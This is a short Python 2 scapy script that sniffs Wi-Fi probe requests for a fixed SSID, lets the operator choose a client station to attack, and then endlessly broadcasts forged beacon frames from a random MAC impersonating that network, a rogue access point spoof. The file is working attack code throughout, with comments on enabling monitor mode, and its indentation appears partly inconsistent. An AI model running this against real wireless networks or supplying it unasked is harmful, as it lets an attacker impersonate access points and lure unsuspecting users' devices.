#!/usr/bin/env python

# sources
# https://security.stackexchange.com/questions/130590/sending-probe-request-frames-receving-probe-response-scapy
# http://www.nicola-spanti.info/fr/documents/tutorials/computing/programming/python/scapy/search-ssid-with-probe-request.html
# https://community.cisco.com/t5/wireless-mobility-documents/802-11-frames-a-starter-guide-to-learn-wireless-sniffer-traces/ta-p/3110019

from scapy.all import *

pkt_list = []
invalid = True
counter = -1
input_id = -1
chan = 0
interface = "wlan0mon"
target_ssid = "EHJ-15769"
fake_ap_mac = RandMAC()

def PacketHandler(pkt) :
	global counter
	global chan
	if pkt.haslayer(Dot11) :
		# here we check the probe requests
		if pkt.type == 0 and pkt.subtype == 8 :
			if pkt not in pkt_list and pkt.info.decode("utf-8") == target_ssid :
				pkt_list.append(pkt)
				counter += 1
                                print "ID: %d - STA MAC: %s with SSID: %s" %(counter, pkt.addr2, pkt.info)

# we start sniffing packets on interface wlan0mon, it must first be activated with sudo airmon-ng start wlan0
sniff(iface=interface, prn = PacketHandler, count=100)

# asking the user wich network to attack
while invalid:
        print("Please select which network to attack by their id:")

        # user input
        input_id = raw_input("STA id: ")

        if not input_id.isdigit():
                continue

        input_id = int(input_id)

        if input_id < 0 or input_id > len(pkt_list)-1:
                print("Invalid id")
        else:
                invalid = False

# we define a new variable which is the target the user chose to attack
target = pkt_list[input_id]

# putting ssid in the frame
essid = Dot11Elt(ID="SSID", info=target.info, len=len(target.info))

# 802.11 frame template, we want to broadcast it since we're mocking an AP
dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_ap_mac, addr3=fake_ap_mac)

# beacon layer
beacon = Dot11Beacon(cap='ESS+privacy')

attack_frame = RadioTap()/dot11/beacon/essid

print "Press CTRL+C to stop sending beacons: "
sendp(attack_frame, iface=interface, inter=0.1, loop=1)
print "Exiting..."
